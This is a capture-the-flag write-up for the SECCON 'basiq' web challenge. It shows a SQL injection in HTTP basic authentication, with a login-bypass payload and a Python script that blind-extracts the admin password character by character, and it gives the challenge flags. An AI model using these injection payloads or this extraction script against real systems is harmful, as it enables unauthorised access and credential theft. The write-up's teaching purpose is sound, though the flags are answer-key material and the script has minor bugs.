﻿# basiq (web, 100, 31 solves)

> what is admin's password?☺


[image extracted text: race information
ranking
pw
login
signup
race information
[upcoming races
race name
post time
iaii race information
aii-star
sapporo
hakodate
fukushima
niigata
tokyo
nakayama
race name
post time
sapporo_ist race
done
sapporo 2nd race
done
sapporo_3rd race
done
sapporo ath race
done
sapporo_sth race
done
sapporo gth race
done
sapporo_zth race
done
sapporo 8th race
done
sapporo_9th race
done
sapporo_ith race
done]



http://basiq.pwn.seccon.jp/admin turned out to be vulnerable to a basic auth sql injection

a simple sqli:

```
user:admin
pass:'or '1'='1
```

works


we'll use the `mid` function to iterate the admins password and brute each letter separately.

``` python 

import requests
import string

url = "http://basiq.pwn.seccon.jp/admin/"
password = "seccon"

alphabet = "_{}" + string.lowercase + string.uppercase

for q in range(len(password)+1, 30):

	found = false

	for i in alphabet:
		r = requests.get(url=url, auth=('admin', "zaaaqwewqz' or (id = 'admin' and mid(binary pass, 1, {}) = '{}') #".format(q, password+i)))

		if(r.status_code == 200):
			password += i
			print(password)
			found = true
			break

	if(not found):
		print("dead end :c")
		break
```
a quick explaination:

the `id` column has to be set to `admin` otherwise we'd get other players' passwords (shout-out to `seccon{a_sql_injection_is_easy}`)

`binary pass` makes sure, that the compare is case sensitive.

after a few minutes of work, we got our flag: `seccon{carnival}`
